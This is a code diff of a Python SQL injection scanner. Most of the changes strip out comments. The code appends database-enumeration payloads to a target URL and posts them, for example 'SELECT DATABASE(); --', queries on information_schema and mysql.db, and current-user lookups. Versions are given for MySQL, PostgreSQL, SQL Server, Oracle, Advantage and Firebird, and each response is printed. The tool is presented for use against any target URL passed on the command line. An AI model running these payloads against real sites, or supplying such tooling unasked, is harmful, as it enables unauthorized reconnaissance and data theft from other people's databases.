@@ -62,14 +62,14 @@ class SQLInjectionScanner:
     async def perform_mysql_get_database_name(self):
         print("MySQL: Retrieving Database name...")
         for query in [
-            "SELECT DATABASE(); --",  # Basic Query for Database Name
-            "SELECT SCHEMA_NAME FROM information_schema.schemata; --",  # Query for Schema Names
-            "SELECT DISTINCT(db) FROM mysql.db; --",  # Query for distinct databases
-            "SELECT GROUP_CONCAT(DISTINCT db) FROM mysql.db; --",  # Query using GROUP_CONCAT
-            "SHOW DATABASES; --",  # Query using SHOW DATABASES
-            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.tables; --",  # Query using INFORMATION_SCHEMA.TABLES
-            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.views; --",  # Query using INFORMATION_SCHEMA.VIEWS
-            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.columns; --",  # Query using INFORMATION_SCHEMA.COLUMNS
+            "SELECT DATABASE(); --", 
+            "SELECT SCHEMA_NAME FROM information_schema.schemata; --",  
+            "SELECT DISTINCT(db) FROM mysql.db; --",  
+            "SELECT GROUP_CONCAT(DISTINCT db) FROM mysql.db; --",  
+            "SHOW DATABASES; --", 
+            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.tables; --",  
+            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.views; --", 
+            "SELECT DISTINCT TABLE_SCHEMA FROM information_schema.columns; --",  
         ]:
             post_data = {}
             full_url = f'{self.target_url}+{query}'
@@ -84,10 +84,10 @@ class SQLInjectionScanner:
     async def perform_postgre_get_database_name(self):
         print("PostgreSQL: Retrieving Database name...")
         for query in [
-            "SELECT current_database(); --",  # Basic Query for Database Name
-            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  # Query using INFORMATION_SCHEMA.TABLES
-            "SELECT DISTINCT table_catalog FROM information_schema.views; --",  # Query using INFORMATION_SCHEMA.VIEWS
-            "SELECT DISTINCT table_catalog FROM information_schema.columns; --",  # Query using INFORMATION_SCHEMA.COLUMNS
+            "SELECT current_database(); --", 
+            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  
+            "SELECT DISTINCT table_catalog FROM information_schema.views; --", 
+            "SELECT DISTINCT table_catalog FROM information_schema.columns; --", 
         ]:
             post_data = {}
             full_url = f'{self.target_url}+{query}'
@@ -102,10 +102,10 @@ class SQLInjectionScanner:
     async def perform_microsoftsql_get_database_name(self):
         print("Microsoft SQL Server: Retrieving Database name...")
         for query in [
-            "SELECT DB_NAME(); --",  # Basic Query for Database Name
-            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  # Query using INFORMATION_SCHEMA.TABLES
-            "SELECT DISTINCT table_catalog FROM information_schema.views; --",  # Query using INFORMATION_SCHEMA.VIEWS
-            "SELECT DISTINCT table_catalog FROM information_schema.columns; --",  # Query using INFORMATION_SCHEMA.COLUMNS
+            "SELECT DB_NAME(); --",  
+            "SELECT DISTINCT table_catalog FROM information_schema.tables; --",  
+            "SELECT DISTINCT table_catalog FROM information_schema.views; --",  
+            "SELECT DISTINCT table_catalog FROM information_schema.columns; --",
         ]:
             post_data = {}
             full_url = f'{self.target_url}+{query}'
@@ -120,15 +120,14 @@ class SQLInjectionScanner:
     async def perform_oracle_get_database_name(self):
         print("Oracle: Retrieving Database name...")
         for query in [
-            "SELECT DISTINCT tablespace_name FROM user_tables; --",  # Query using USER_TABLES
-            "SELECT DISTINCT tablespace_name FROM user_views; --",  # Query using USER_VIEWS
-            "SELECT DISTINCT tablespace_name FROM user_tab_columns; --",  # Query using USER_TAB_COLUMNS
+            "SELECT DISTINCT tablespace_name FROM user_tables; --", 
+            "SELECT DISTINCT tablespace_name FROM user_views; --",  
+            "SELECT DISTINCT tablespace_name FROM user_tab_columns; --",  
         ]:
             post_data = {}
             full_url = f'{self.target_url}+{query}'
 
             try:
-                # Changed from session.post to self.session.post
                 async with self.session.post(full_url, data=post_data) as response:
                     result = await response.text()
                     print(result)
@@ -138,9 +137,9 @@ class SQLInjectionScanner:
     async def perform_advantage_get_database_name(self):
         print("Advantage Database: Retrieving Database name...")
         for query in [
-            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageTable WHERE AdsDatabaseName IS NOT NULL; --",  # Query using INFORMATION_SCHEMA.AdvantageTable
-            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageColumn WHERE AdsDatabaseName IS NOT NULL; --",  # Query using INFORMATION_SCHEMA.AdvantageColumn
-            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageView WHERE AdsDatabaseName IS NOT NULL; --",  # Query using INFORMATION_SCHEMA.AdvantageView
+            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageTable WHERE AdsDatabaseName IS NOT NULL; --",
+            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageColumn WHERE AdsDatabaseName IS NOT NULL; --",  
+            "SELECT DISTINCT AdsDatabaseName FROM INFORMATION_SCHEMA.AdvantageView WHERE AdsDatabaseName IS NOT NULL; --", 
         ]:
             post_data = {}
             full_url = f'{self.target_url}+{query}'
@@ -155,9 +154,9 @@ class SQLInjectionScanner:
     async def perform_firebird_get_database_name(self):
         print("Firebird: Retrieving Database name...")
         for query in [
-            "SELECT DISTINCT rdb$database_name FROM rdb$database; --",  # Query using rdb$database
-            "SHOW DATABASE; --",  # Query using SHOW DATABASE
-            "SELECT DISTINCT current_database FROM rdb$database; --",  # Query using current_database
+            "SELECT DISTINCT rdb$database_name FROM rdb$database; --", 
+            "SHOW DATABASE; --", 
+            "SELECT DISTINCT current_database FROM rdb$database; --", 
         ]:
             post_data = {}
             full_url = f'{self.target_url}+{query}'
@@ -172,7 +171,6 @@ class SQLInjectionScanner:
     async def close_session(self):
         await self.session.close()
 
-# Get Current User
     async def get_current_user(self):
         print(f"Getting current user for {self.database_type} database...")
 
@@ -191,7 +189,6 @@ class SQLInjectionScanner:
         else:
             print(f"Unsupported database type: {self.database_type}")
 
-# Get Current user based on DB Type
     async def perform_microsoftsql_get_current_user(self):
         print("Microsoft SQL Server: Retrieving current user...")
         async with aiohttp.ClientSession() as session:
@@ -363,7 +360,6 @@ class SQLInjectionScanner:
                             print(f"MySQL: Retrieving current user response for query '{query}': {current_user}")
                 except Exception as e:
                     print(f"MySQL: Error performing POST request for query '{query}': {e}")
-############################################################################################################################
 
     @classmethod
     async def create(cls, target_url):
@@ -380,7 +376,6 @@ async def main():
     parser.add_argument("target_url", help="Target URL")
     args = parser.parse_args()
 
-    # Creating the scanner and running the scan
     scanner = SQLInjectionScanner(args.target_url, "")
     db_type = await scanner.scan_database_type()
     
@@ -390,7 +385,6 @@ async def main():
     else:
         print(f"Could not find a vulnerability...")
 
-    # Closing the session when done
     await scanner.close_session()
 
 if __name__ == "__main__":
